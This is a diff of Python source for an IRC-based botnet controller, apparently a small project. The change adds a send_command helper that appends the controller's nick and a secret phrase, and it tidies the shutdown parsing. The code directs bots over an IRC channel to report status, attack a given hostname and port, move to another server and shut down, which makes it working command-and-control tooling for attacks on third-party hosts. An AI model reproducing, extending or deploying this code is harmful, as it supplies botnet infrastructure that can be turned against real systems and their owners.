@@ -18,14 +18,15 @@ atk_cnt = 0
 active = True
 
 #send a command to the bots
-def send_command():
+def send_command(msg):
+	send("PRIVMSG " + channel + " :" + msg + " " + nick + " " + secret_phrase + "\n")
 	return
 
 
 
 #ids bots and prints out numbers
 def cmd_status():
-	send("PRIVMSG " + channel +" :"+"status"+"\n")
+	send_command("status")
 	##gets replieds back from irc
 	msg = ""
 	while msg == "":
@@ -45,7 +46,7 @@ def cmd_status():
 	
 #tells the bots to attack the hostname
 def cmd_attack(hostname, port):
-	send("PRIVMSG " + channel +" :"+"attack "+ hostname + " " + port +"\n")
+	send_command("attack "+ hostname + " " + port)
 	#bots send a message back to controller telling if success or not  
 	msg = ""
 	while msg == "":
@@ -74,7 +75,7 @@ def cmd_attack(hostname, port):
 #move bots from current irc to new irc
 def cmd_move(hostname, port, chan):
 	#instructs bots to disconnect from current irc and move to another one
-	send("PRIVMSG " + channel +" :"+"move "+ hostname + " " + port + " " + chan + "\n")
+	send_command("move "+ hostname + " " + port + " " + chan)
 	#bots send a message back to controller telling if success or not  
 	msg = ""
 	while msg == "":
@@ -109,7 +110,7 @@ def cmd_quit():
 
 #this kills the bot(s)
 def cmd_shutdown():
-	send("PRIVMSG " + channel +" "+"shutdown"+"\n")
+	send_command("shutdown")
 	msg = ""
 	bot_names = []
 	numbots = 0
@@ -121,14 +122,15 @@ def cmd_shutdown():
 	for line in msgs:
 		bot_status = (line[line.find(':', 1)+1:] + "\n").strip()
 		bot_status = bot_status.split()
-		bot = bot_status[0]
-		status = bot_status[1]
-		if status == "shutdown":
-			bot_names.append(bot)
+		if bot_status[0] != "EOT": 
+			bot = bot_status[0]
+			status = bot_status[1]
+			if status == "shutdown":
+				bot_names.append(bot)
+				print(bot + ": shutting down... ")
 	print("Total: "+str(len(bot_names))+" bots shut down")
 	return
 
-s
 #wait for a user to send command to the irc needs error checking
 def get_command():
 	msg = input("command> ")
@@ -139,12 +141,8 @@ def get_command():
 #send as bytes TO DO
 def send(msg):
 	global con_active
-	#try:
 	irc.send(msg.encode('UTF-8'))
-	#except someerror:
-		#con_active = False
 	return
-	
 	
 #receive a command from the controller TO DO parsing needed and error checking
 def rcv_irc_response():
@@ -172,12 +170,12 @@ def connect(host, port):
 	send("USER " + nick + " " + nick + " " + nick + ": This controller is connecting\n") 
 	send("NICK " + nick + "\n")
 	send("JOIN " + channel + "\n")
+	
 	return 
 
 
 #handle the connection to the IRC server
 def handle_connection():
-	#TO DO Verify controller
 	print('command> ', end = '', flush=True)
 	while active:
 		readable, writeable, exceptable = select.select([irc,sys.stdin],[sys.stdout],[])
